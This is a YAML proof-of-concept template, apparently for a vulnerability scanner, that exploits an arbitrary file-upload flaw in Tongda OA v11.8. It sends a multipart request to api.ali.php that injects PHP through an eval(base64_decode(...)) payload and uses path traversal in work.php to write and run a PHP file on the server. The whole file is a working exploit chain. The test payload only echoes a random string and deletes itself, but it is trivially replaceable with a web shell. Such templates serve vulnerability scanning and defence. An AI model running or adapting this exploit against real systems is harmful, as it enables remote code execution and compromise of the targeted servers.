name: poc-yaml-tongdaoa-v11-8-api-ali-php-writefile
binding: 31b678cc-79a1-4379-8887-fb6a94817a21
detail:
    author: chain
    links:
        - http://wiki.peiqi.tech/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.8%20api.ali.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html
transport: http
set:
    rboundary: randomLowercase(32)
    surl: substr(replaceAll(timeConvert(int(now()), "2006_01_02/3/4/05"), "_", ""), 2, 4)
    r1: randomLowercase(20)
    r2: randomLowercase(20)
    phpcode: '"file_put_contents(''../../" + r1 + ".php'',''<?php echo \"" + r2 + "\"; unlink(__FILE__); ?>'');"'
    b64: base64(phpcode)
rules:
    r0:
        request:
            method: POST
            path: /mobile/api/api.ali.php
            follow_redirects: false
            headers:
                Content-Type: multipart/form-data; boundary={{rboundary}}
            body: |-
                --{{rboundary}}
                Content-Disposition: form-data; name="file"; filename="{{r1}}.json"
                Content-Type: application/octet-stream
                {"modular":"AllVariable","a":"{{b64}}","dataAnalysis":"{\"a\":\"éŒ¦',$BackData[dataAnalysis] => eval(base64_decode($BackData[a])));/*\"}"}
                --{{rboundary}}--
        expression: response.status == 200
    r1:
        request:
            method: GET
            path: /inc/package/work.php?id=../../../../../myoa/attach/approve_center/{{surl}}/%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E.{{r1}}
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(b"+OK")
    r2:
        request:
            method: GET
            path: /{{r1}}.php
            follow_redirects: false
        expression: response.status == 200 && response.body_string.contains(r2)
expression: r0() && r1() && r2()
